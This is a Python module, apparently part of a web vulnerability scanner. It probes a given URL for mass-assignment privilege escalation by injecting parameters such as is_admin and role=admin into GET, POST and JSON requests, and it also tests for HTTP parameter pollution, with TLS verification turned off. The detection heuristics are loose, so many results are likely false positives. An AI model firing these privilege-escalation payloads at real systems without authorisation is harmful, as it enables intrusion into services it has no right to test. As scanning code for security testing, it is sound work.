import requests
import json

# Common privileged parameters untuk mass assignment
PRIVILEGED_PARAMS = [
    "admin", "is_admin", "isAdmin", "role", "user_role", "userRole",
    "is_superuser", "isSuperuser", "superuser", "privileges", "permissions",
    "is_staff", "isStaff", "staff", "verified", "is_verified", "isVerified",
    "active", "is_active", "isActive", "enabled", "is_enabled", "isEnabled",
    "price", "amount", "balance", "credit", "points", "discount",
    "user_id", "userId", "account_id", "accountId", "id",
]

def test_mass_assignment(url, params):
    """Test Mass Assignment / Parameter Pollution vulnerabilities."""
    results = []
    
    # Test 1: Add privileged parameters
    for priv_param in PRIVILEGED_PARAMS[:10]:  # Test first 10
        test_params = params.copy()
        
        # Try different values
        test_values = [
            "true", "1", "admin", "administrator", "999999", "0"
        ]
        
        for value in test_values[:2]:  # Test 2 values per param
            test_params[priv_param] = value
            
            try:
                # Test GET
                response = requests.get(url, params=test_params, timeout=10, verify=False)
                
                # Compare with normal request
                normal_response = requests.get(url, params=params, timeout=10, verify=False)
                
                # Check for privilege escalation indicators
                if response.status_code != normal_response.status_code:
                    if response.status_code in [200, 302] and normal_response.status_code in [401, 403]:
                        results.append({
                            "type": "Mass Assignment - Privilege Escalation",
                            "severity": "CRITICAL",
                            "param": priv_param,
                            "payload": f"{priv_param}={value}",
                            "detail": f"Status changed: {normal_response.status_code} -> {response.status_code}"
                        })
                        return results
                
                # Check response content for privilege indicators
                priv_indicators = ["admin", "administrator", "superuser", "elevated", "privileged"]
                if any(ind in response.text.lower() for ind in priv_indicators):
                    if not any(ind in normal_response.text.lower() for ind in priv_indicators):
                        results.append({
                            "type": "Possible Mass Assignment",
                            "severity": "HIGH",
                            "param": priv_param,
                            "payload": f"{priv_param}={value}",
                            "detail": "Privileged content appeared in response"
                        })
                
                # Test POST
                post_response = requests.post(url, data=test_params, timeout=10, verify=False)
                if "success" in post_response.text.lower() or post_response.status_code in [200, 201]:
                    results.append({
                        "type": "Possible Mass Assignment (POST)",
                        "severity": "HIGH",
                        "param": priv_param,
                        "payload": f"{priv_param}={value}",
                        "detail": "Additional parameter accepted in POST request"
                    })
                    
            except requests.RequestException:
                pass
    
    # Test 2: JSON mass assignment
    if params:
        test_json = params.copy()
        test_json["is_admin"] = True
        test_json["role"] = "admin"
        
        try:
            response = requests.post(
                url,
                json=test_json,
                headers={"Content-Type": "application/json"},
                timeout=10,
                verify=False
            )
            
            if response.status_code in [200, 201]:
                body = response.text.lower()
                if "admin" in body or "success" in body:
                    results.append({
                        "type": "Mass Assignment via JSON",
                        "severity": "HIGH",
                        "param": "JSON Body",
                        "payload": json.dumps(test_json),
                        "detail": "Privileged parameters accepted in JSON request"
                    })
        except:
            pass
    
    return results

def test_parameter_pollution(url, params):
    """Test HTTP Parameter Pollution (HPP)."""
    results = []
    
    for param in params:
        # Test duplicate parameters
        test_url = f"{url}?{param}=value1&{param}=value2"
        
        try:
            response = requests.get(test_url, timeout=10, verify=False)
            
            # Check if both values processed
            if "value1" in response.text and "value2" in response.text:
                results.append({
                    "type": "HTTP Parameter Pollution",
                    "severity": "MEDIUM",
                    "param": param,
                    "payload": f"{param}=value1&{param}=value2",
                    "detail": "Multiple parameter values processed - possible HPP"
                })
            
            # Test array notation
            test_url_array = f"{url}?{param}[]=value1&{param}[]=value2"
            response_array = requests.get(test_url_array, timeout=10, verify=False)
            
            if response_array.status_code == 200:
                results.append({
                    "type": "Array Parameter Accepted",
                    "severity": "INFO",
                    "param": param,
                    "payload": f"{param}[]=value",
                    "detail": "Array notation accepted - verify proper validation"
                })
                
        except:
            pass
    
    return results
